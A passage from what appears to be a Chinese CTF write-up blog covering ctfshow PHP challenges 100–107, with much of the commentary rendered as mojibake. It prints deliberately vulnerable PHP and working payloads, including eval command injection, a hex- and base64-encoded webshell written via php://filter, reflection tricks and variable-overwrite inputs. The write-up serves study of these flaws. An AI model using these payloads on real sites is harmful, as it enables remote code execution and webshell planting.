class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">and</span> ä¸ &amp;&amp;çš„å·®åˆ«ï¼š<span class="keyword">and</span> å› ä¸ºä¼˜å…ˆçº§çš„åŸå› ï¼Œä¼šå‡ºç°ä¸€äº›å·®é”™ã€‚</span><br><span class="line">å¦‚ <span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span> ä¼šè¿”å› <span class="literal">true</span>ã€‚</span><br><span class="line">ä½†æ˜¯ <span class="literal">false</span> <span class="keyword">and</span> <span class="literal">true</span> ä¼šè¿”å› <span class="literal">false</span></span><br><span class="line">ä½†æ˜¯ä»…åœ¨è¿ç®—æ—¶æˆç«‹ï¼Œåœ¨<span class="keyword">if</span>ä¸­ä¸&amp;&amp;æ•ˆæœç›¸åŒã€‚</span><br><span class="line">æ ¹æ®é¢˜æ„ï¼šå¯ä»¥é€šè¿‡v2å’Œv3æ‹¼æ¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œã€‚</span><br><span class="line">è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯<span class="keyword">eval</span>æ‹¬å·é‡Œé¢çš„ä»£ç å¿…é¡»æ˜¯æ­£ç¡®èƒ½å¤Ÿæ‰§è¡Œçš„ã€‚</span><br><span class="line">å› æ­¤æˆ‘ä»¬å°†<span class="string">&#x27;(ctfshow)&#x27;</span>æ³¨é‡Šæ‰</span><br><span class="line">æœ‰ä¸ªç»†èŠ‚v2ä¸­ä¸èƒ½å‡ºç°<span class="string">&quot;;&quot;</span>ã€‚æˆ‘ä»¬åˆ©ç”¨å¤šè¡Œæ³¨é‡Šåœ¨v3ä¸­æ³¨é‡Šåæ·»åŠ ;</span><br><span class="line">payload:?v1=<span class="number">1</span>&amp;v2=system(<span class="string">&quot;cat ctfshow.php&quot;</span>)<span class="comment">/*&amp;v3=*/</span>;</span><br></pre></td></tr></table></figure><h1 id="web-101-åå°„ç±»"><a href="#web-101-åå°„ç±»" class="headerlink" title="web 101:åå°„ç±»"></a>web 101:åå°„ç±»</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> ctfshow();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=is_numeric(<span class="variable">$v1</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\# |\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\# |\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¿™é‡Œåœ¨ä¸Šé¢˜çš„åŸºç¡€ä¸Šå°†æˆ‘ä»¬çš„RCEè¿‡æ»¤æ‰äº†ã€‚å› æ­¤åªèƒ½ç”¨å®˜æ–¹ç»™çš„åå°„ç±»äº†ã€‚</span><br><span class="line">åœ¨æ­¤ç»™å‡ºä»€ä¹ˆæ˜¯PHPçš„åå°„ç±»ï¼šåå°„ç±»æ˜¯phpä¸­çš„ä¸€ä¸ªåŸç”Ÿç±»ï¼Œå…¶å¯ä»¥æ¥å—ä¸€ä¸ªå®ä¾‹åŒ–å¯¹è±¡ä½œä¸ºå‚æ•°ã€‚</span><br><span class="line">å¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨åå°„ç±»ä¸­çš„è‡ªå¸¦æ–¹æ³•ä»è€Œè¾¾åˆ°å¯¹å®ä¾‹åŒ–å¯¹è±¡çš„ä¿¡æ¯è¯»å–ã€‚</span><br><span class="line">è¿™ä¸ªé¢˜ç¾¤ä¸»æœ‰æ¯’ã€‚æ‹¿åˆ°flagä¹‹åéœ€è¦å°†<span class="number">0x2d</span>æ›¿æ¢æˆ-å·å°±ç®—äº†</span><br><span class="line">flagçš„æœ€åå°‘ä¸€ä½ï¼Œéœ€è¦æˆ‘ä»¬è‡ªå·±æ‹¿ç€ä»<span class="number">0</span>å¼€å§‹å®éªŒã€‚æˆ‘è¿æ°”æ¯”è¾ƒå¥½ã€‚æœ€åä¸€ä½æ˜¯<span class="number">2</span></span><br><span class="line">è¯•äº†ä¸‰æ¬¡å°±æˆåŠŸäº†</span><br><span class="line">payload:?v1=<span class="number">1</span>&amp;v2=<span class="keyword">echo</span> <span class="keyword">new</span> ReflectionMethod&amp;v3=;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„è´´å‡ºç¾½å¸ˆå‚…ä¸€ä¸ªåå°„ç±»è¿ç”¨åŠ æ·±ç†è§£ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ReflectionClass(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getConstants());  è·å–ä¸€ç»„å¸¸é‡</span><br><span class="line">è¾“å‡º</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getName());    è·å–ç±»å</span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"> </span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getStaticProperties()); è·å–é™æ€å±æ€§</span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var_dump(<span class="variable">$a</span>-&gt;getMethods()); è·å–ç±»ä¸­çš„æ–¹æ³•</span><br><span class="line">è¾“å‡º</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment"># 2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-102-php5ä¸‹andå’Œphpä¼ªåè®®ä¸call-user-funcä½¿ç”¨"><a href="#web-102-php5ä¸‹andå’Œphpä¼ªåè®®ä¸call-user-funcä½¿ç”¨" class="headerlink" title="web 102:php5ä¸‹andå’Œphpä¼ªåè®®ä¸call_user_funcä½¿ç”¨"></a>web 102:php5ä¸‹andå’Œphpä¼ªåè®®ä¸call_user_funcä½¿ç”¨</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">æˆ‘å¼€å§‹æ²¡æœ‰æƒ³åˆ°ä¸¤ä¸ªåœ°æ–¹ç»“åˆèµ·æ¥ä½¿ç”¨ï¼Œä»¥ä¸ºæ˜¯ç”¨call_user_funcå°±èƒ½è¾¾åˆ°å‘½ä»¤æ‰§è¡Œã€‚</span><br><span class="line">æ ¹æ®æç¤ºæ¢ä¸ªå§¿åŠ¿ï¼Œä¹Ÿå°±æ˜¯ä¹Ÿæ˜¯åˆ©ç”¨å†™é©¬çš„è®¡åˆ’ã€‚</span><br><span class="line">åœ¨PHP5ä¸‹,<span class="number">0x117c</span>ä¼šè¢«is_numericè®¤ä¸ºæˆ<span class="literal">true</span>ã€‚</span><br><span class="line">ä¹Ÿå°±æ˜¯<span class="number">16</span>è¿›åˆ¶æ˜¯å¯ä»¥è¢«åˆ©ç”¨çš„ã€‚</span><br><span class="line"><span class="comment"># &lt;?php eval($_POST[1]);?&gt; == 3C3F706870206576616C28245F504F53545B315D293B3F3E</span></span><br><span class="line">ç„¶åé€šè¿‡å›è°ƒå‡½æ•°ä½¿ç”¨hex2binå¯¹å®ƒè¿›è¡Œè§£ç ã€‚å¹¶ä¸”å†™å…¥åˆ°<span class="number">1</span>.phpä¸­</span><br><span class="line"> </span><br><span class="line">fake_payload:</span><br><span class="line">         GET:?v2=<span class="number">113</span>C3F706870206576616C28245F504F53545B315D293B3F3E&amp;v3=<span class="number">1</span>.php</span><br><span class="line">         POST:v1=hex2bin</span><br><span class="line">å‘ç°ä¸æˆåŠŸã€‚æœ¬é¢˜å¯èƒ½ä½¿ç”¨çš„æ˜¯PHP7ç¯å¢ƒã€‚é‚£ä¹ˆå†æ¢ä¸ªå§¿åŠ¿,è¿˜æ˜¯ä½¿ç”¨è¿™ç§å½¢å¼å»å¯»æ‰¾æ›¿ä»£ã€‚</span><br><span class="line">ç›®çš„æ˜¯ï¼šæŸPHPè¯­å¥å†ç»è¿‡<span class="number">16</span>è¿›åˆ¶ç¼–ç åä»å…¨ä¸ºæ•°å­—ã€‚æˆ–è€…ç§‘å­¦è®¡æ•°æ³•å½¢å¼ã€‚</span><br><span class="line">çœ‹äº†å¸ˆå‚…ä»¬çš„WPï¼š</span><br><span class="line"><span class="string">&#x27;&lt;?=`cat *`;&#x27;</span> ---&gt;base64-encode---&gt;bin2hex----&gt;<span class="number">5044383959474e6864434171594473</span></span><br><span class="line">é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨call_user_funcå…ˆè¿›è¡Œhex2bin</span><br><span class="line">å†åˆ©ç”¨file_put_contentsè¿›è¡Œfilterä¼ªåè®®base64çš„è§£ç ã€‚ä»è€Œè¾¾åˆ°å†™é©¬ç›®çš„</span><br><span class="line"> </span><br><span class="line">payload:</span><br><span class="line">        GET:?v2=<span class="number">215044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=1.php</span></span><br><span class="line">        POST:v1=hex2bin</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-103"><a href="#web-103" class="headerlink" title="web 103:"></a>web 103:</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = is_numeric(<span class="variable">$v2</span>) <span class="keyword">and</span> is_numeric(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = substr(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = call_user_func(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;</span><br><span class="line">        file_put_contents(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¿™é¢˜åœ¨ä¸Šé¢˜åŸºç¡€ä¸ŠåŠ äº†æ­£åˆ™è¿‡æ»¤ï¼Œä½†æ˜¯è¿‡æ»¤çš„æ˜¯v2ã€‚æˆ‘ä»¬ä¼ªåè®®ä½¿ç”¨çš„æ˜¯v3ã€‚æ‰€ä»¥ä¸å½±å“ã€‚</span><br><span class="line">payload:</span><br><span class="line">             GET:?v2=<span class="number">215044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/read=convert.base64-decode/resource=1.php</span></span><br><span class="line">             POST:v1=hex2bin</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-104-sha1æ— æ³•å¤„ç†æ•°ç»„"><a href="#web-104-sha1æ— æ³•å¤„ç†æ•°ç»„" class="headerlink" title="web 104:sha1æ— æ³•å¤„ç†æ•°ç»„"></a>web 104:sha1æ— æ³•å¤„ç†æ•°ç»„</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">å› ä¸ºsha1æ— æ³•å¤„ç†æ•°ç»„,sha1åœ¨å¯¹æ•°ç»„è¿›è¡Œå¤„ç†æ—¶ä¼šè¿”å›<span class="literal">NULL</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-105-å˜é‡è¦†ç›–"><a href="#web-105-å˜é‡è¦†ç›–" class="headerlink" title="web 105:å˜é‡è¦†ç›–"></a>web 105:å˜é‡è¦†ç›–</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">è¿™ä¸ªé¢˜æˆ‘æ¯”è¾ƒèœ,å¯¹phpæ•°ç»„éå†çš„æ‰‹æ³•ä¸ç†Ÿæ‚‰.</span><br><span class="line">æˆ‘åªçŸ¥é“è€ƒäº†å˜é‡è¦†ç›–.ä½†æ˜¯è¿›å…¥æ•°ç»„éå†æˆ‘å°±ä¸è¡Œäº†.</span><br><span class="line">çœ‹äº†wpå¤§æ¦‚æ˜ç™½æ˜¯ä¸ªä»€ä¹ˆæ„æ€äº†.</span><br><span class="line">å…ˆè¯´æ•°ç»„éå†:</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) è¿™é‡Œçš„æ„æ€æ˜¯æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªå‚æ•°</span><br><span class="line">      å‚æ•°åä¸ºé”®åKey å‚æ•°å€¼ä¸ºé”®å€¼</span><br><span class="line">      å¦‚ä¼ å…¥ a=<span class="number">123</span> é‚£ä¹ˆ<span class="variable">$key</span>=a&amp;<span class="variable">$value</span>=<span class="number">123</span></span><br><span class="line">      é‚£ä¹ˆç°åœ¨å°±æ¯”è¾ƒå¥½ç†è§£äº†.</span><br><span class="line">è¿™ä¸ª<span class="keyword">echo</span> è¯­å¥æˆ‘ä»¬æ˜¯åˆ°è¾¾ä¸äº†çš„.</span><br><span class="line">ä½†æ˜¯ <span class="keyword">die</span>ä¹Ÿä¼šè¾“å‡ºå†…å®¹.é‚£ä¹ˆæˆ‘ä»¬ä»¤<span class="keyword">die</span>çš„å˜é‡ä¸ºflagå³å¯.</span><br><span class="line">payload:</span><br><span class="line">        GET:suces=flag</span><br><span class="line">        POST:<span class="built_in">error</span>=suces</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-106"><a href="#web-106" class="headerlink" title="web 106:"></a>web 106:</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1(<span class="variable">$v1</span>)==sha1(<span class="variable">$v2</span>) &amp;&amp; <span class="variable">$v1</span>!=<span class="variable">$v2</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">æ•°ç»„ç»•è¿‡.æ²¡ä»€ä¹ˆå¥½è¯´çš„</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web-107-parse-strç‰¹æ€§ã€‚"><a href="#web-107-parse-strç‰¹æ€§ã€‚" class="headerlink" title="web 107:parse_strç‰¹æ€§ã€‚"></a>web 107:parse_strç‰¹æ€§ã€‚</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = <span 